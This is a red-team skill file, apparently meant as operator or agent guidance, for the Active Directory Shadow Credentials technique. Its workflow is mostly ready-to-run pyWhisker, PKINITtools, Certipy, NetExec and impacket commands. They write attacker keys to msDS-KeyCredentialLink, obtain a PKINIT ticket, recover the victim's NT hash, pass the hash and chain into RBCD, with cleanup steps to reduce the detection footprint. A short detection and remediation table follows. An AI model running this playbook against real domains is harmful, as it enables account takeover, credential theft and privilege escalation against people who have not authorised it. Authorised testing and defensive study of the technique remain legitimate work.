---
name: abusing-shadow-credentials-for-privesc
description: Take over Active Directory accounts by writing attacker-controlled public keys to msDS-KeyCredentialLink (Shadow Credentials) with pyWhisker, Whisker, or Certipy, then authenticate via PKINIT to recover the target's NT hash without a password reset. Use when BloodHound shows GenericWrite/GenericAll/AddKeyCredentialLink over a target, as a stealthier alternative to ForceChangePassword, during authorized red-team engagements. Do not use for exploiting AD CS certificate-authority and template misconfigurations across ESC1-ESC16 - use exploiting-adcs-with-certipy.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- active-directory
- shadow-credentials
- pywhisker
- certipy
- pkinit
- key-credential-link
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-05
mitre_attack:
- T1098.005
---
# Abusing Shadow Credentials for Privilege Escalation

> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Shadow Credentials grant full takeover of the targeted account. Use only against systems you own or are explicitly authorized in writing to test. Unauthorized access is a crime.

## Overview

The **Shadow Credentials** technique abuses the `msDS-KeyCredentialLink` attribute of Active Directory user and computer objects. This attribute stores raw public keys ("Key Credentials") used by Windows Hello for Business and Azure AD device registration for passwordless certificate-based logon via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos). If an attacker has write permission over a target object's `msDS-KeyCredentialLink` — typically granted by `GenericWrite`, `GenericAll`, `WriteProperty`, or `AddKeyCredentialLink` ACEs surfaced in BloodHound — they can append their own attacker-generated public key. They then request a TGT for the target via PKINIT using the matching private key and recover the target's NT hash, achieving complete account takeover **without resetting the password**, which is far stealthier than a forced password reset.

The technique was published by Elad Shamir (*"Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover"*) and implemented in the C# tool **Whisker**. The Python equivalent **pyWhisker** (ShutdownRepo) manipulates the attribute over LDAP, and **Certipy** integrates the entire chain via `certipy shadow auto`. The target environment must support PKINIT and have at least one Domain Controller running Windows Server 2016 or later. Sources: [pyWhisker](https://github.com/ShutdownRepo/pywhisker), [Whisker](https://github.com/eladshamir/Whisker), [The Hacker Recipes — Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials).

## When to Use

- When BloodHound reveals `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` over a higher-value user or computer
- As a stealthier alternative to `ForceChangePassword` (no password reset = less disruption/alerting)
- To take over a computer account to chain into Resource-Based Constrained Delegation (RBCD)
- During red-team operations needing account takeover without locking out the legitimate user
- For purple-team exercises generating `msDS-KeyCredentialLink` modification telemetry

## Prerequisites

- Authorized engagement scope including AD credential-access techniques
- Control of a principal with write access to the target's `msDS-KeyCredentialLink`
- A DC running Windows Server 2016+ with PKINIT enabled (domain functional level supporting Key Trust)
- Network reachability to LDAP (389/636) and Kerberos (88) on a DC
- Linux attack host with Python 3.8+; install the tooling:
  ```bash
  # pyWhisker (from source)
  git clone https://github.com/ShutdownRepo/pywhisker
  cd pywhisker && pip install .
  # Certipy (integrated shadow attack)
  pipx install certipy-ad
  # PKINITtools for manual TGT/NT-hash extraction
  git clone https://github.com/dirkjanm/PKINITtools
  ```

## Objectives

- Confirm write access over a target's `msDS-KeyCredentialLink`
- Generate a key pair and append a Key Credential to the target object
- Request a TGT for the target via PKINIT using the new key
- Recover the target's NT hash for pass-the-hash / further movement
- Clean up the injected Key Credential to restore the object's state
- Document the ACL path that enabled the attack for remediation

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1098.005 | Account Manipulation: Device Registration | Writing an attacker-controlled Key Credential (device key) to `msDS-KeyCredentialLink` to register an alternate authentication credential for the target account |

## Workflow

### Step 1: Confirm the write primitive
List existing Key Credentials on the target to verify you have the required access. An empty or readable result confirms write access for the `add` step.

```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "list"
```

### Step 2: Add a Shadow Credential with pyWhisker
Generate a certificate/key pair and write it into the target's `msDS-KeyCredentialLink`. pyWhisker outputs a PFX you control.

```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "add" --filename victim_shadow
# Produces victim_shadow.pfx and prints the PFX password
```
Use Kerberos auth instead of a password if you only hold a ticket:
```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -k --no-pass \
    --target "victim" --action "add" --filename victim_shadow --use-ldaps
```

### Step 3: Request a TGT via PKINIT
Use the generated PFX with PKINITtools to obtain a Kerberos TGT for the target.

```bash
python3 PKINITtools/gettgtpkinit.py \
    -cert-pfx victim_shadow.pfx -pfx-pass <PFX_PASSWORD> \
    corp.local/victim victim.ccache
```

### Step 4: Recover the NT hash
Extract the target's NT hash from the AS-REP using the session key from Step 3 (`getnthash.py` reads the AS-REP encryption key, displayed by `gettgtpkinit.py`).

```bash
export KRB5CCNAME=victim.ccache
python3 PKINITtools/getnthash.py -key <AS-REP-KEY-FROM-STEP-3> corp.local/victim
# Prints the NT hash for 'victim'
```

### Step 5: One-shot alternative with Certipy
Certipy's `shadow auto` performs add → PKINIT → dump hash → cleanup automatically, which is ideal for computer-account takeover.

```bash
certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'victim'
# For a computer account, use the sAMAccountName with trailing $
certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'WS01$'
```

### Step 6: Use the recovered credential
Authenticate with the NT hash (or the TGT) to continue the engagement.

```bash
# Pass-the-hash with NetExec
nxc smb 10.0.0.10 -u victim -H <RECOVERED-NT-HASH>
# Or use the TGT directly
export KRB5CCNAME=victim.ccache
nxc smb dc.corp.local -u victim --use-kcache
```

### Step 7: Chain computer takeover into RBCD (optional)
When the target is a computer, the recovered key/hash lets you configure Resource-Based Constrained Delegation to impersonate any user to that host.

```bash
# Set RBCD so attacker-controlled SPN can impersonate to WS01$
impacket-rbcd -delegate-from 'attacker$' -delegate-to 'WS01$' \
    -action write 'corp.local/attacker:Passw0rd!'
```

### Step 8: Clean up
Remove the injected Key Credential to restore the object and reduce detection footprint.

```bash
# pyWhisker: remove by device-id (printed during add) or clear all you added
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "remove" --device-id <DEVICE-ID>
# Certipy shadow auto cleans up automatically; otherwise:
certipy shadow clear -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'victim'
```

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| pyWhisker | Python LDAP manipulation of msDS-KeyCredentialLink | https://github.com/ShutdownRepo/pywhisker |
| Whisker | Original C# implementation | https://github.com/eladshamir/Whisker |
| Certipy | `shadow auto` end-to-end takeover | https://github.com/ly4k/Certipy |
| PKINITtools | gettgtpkinit / getnthash | https://github.com/dirkjanm/PKINITtools |
| The Hacker Recipes | Technique walkthrough & defenses | https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials |

## Detection and Remediation Notes

| Area | Guidance |
|------|----------|
| Detection | Monitor Windows Security Event ID 5136 (directory object modified) for changes to `msDS-KeyCredentialLink`; alert when a non-AD-Connect/non-Intune principal writes the attribute. |
| Auditing | Enable directory service object change auditing on user/computer OUs. |
| Least privilege | Remove unnecessary `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` ACEs (BloodHound `AddKeyCredentialLink` edge). |
| Mitigation | Where Windows Hello/device registration is unused, restrict who can write Key Credentials and consider tier-0 protected accounts. |

## Validation Criteria

- [ ] Write access over the target's `msDS-KeyCredentialLink` confirmed (`list` succeeded)
- [ ] Key Credential successfully added (PFX generated)
- [ ] PKINIT TGT obtained for the target account
- [ ] Target NT hash recovered and validated against a service
- [ ] (If computer) RBCD chain or onward movement demonstrated
- [ ] Injected Key Credential removed / object restored
- [ ] Enabling ACL path documented with remediation recommendation
